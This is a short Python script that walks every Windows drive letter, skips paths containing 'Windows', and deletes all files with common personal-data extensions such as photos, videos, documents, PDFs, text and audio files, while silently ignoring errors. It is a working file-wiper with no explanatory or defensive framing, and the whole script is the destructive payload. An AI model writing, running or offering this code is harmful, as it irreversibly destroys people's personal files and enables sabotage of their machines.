import os
import glob
import time 
disk = ['A:/', 'E:/', 'I:/', 'O:/', 'U:/', 'Y:/', 
		'B:/', 'D:/', 'F:/', 'G:/', 'H:/', 'J:/', 
		'K:/', 'L:/', 'M:/', 'N:/', 'P:/', 'Q:/', 
		'R:/', 'S:/', 'T:/', 'V:/', 'W:/', 'X:/',
	    'Y:/', 'Z:/', 'C:/']

ras = ['.png', '.jpg', '.jpeg', '.tif', '.tiff',
	   '.gif', '.bmp', '.heic', '.mp4', '.avi',
	   '.mov', '.mpeg', '.avi', '.wmv', '.mpg', 
	   '.py', '.txt', '.doc', '.docx', '.pdf',
	   '.mp3']
# ras = ['.ertyvubinoppoiytre']

s = []
for j in disk:
	t = os.walk(j)
	for i in t:
		if not j + 'Windows' in i[0]:
			s.append(i[0])

for i in s:
	try:
		os.chdir(i)
		for j in ras:
			for file in glob.glob("*"+j):
				os.remove(file)

		time.sleep(0.01)
	except:
		pass

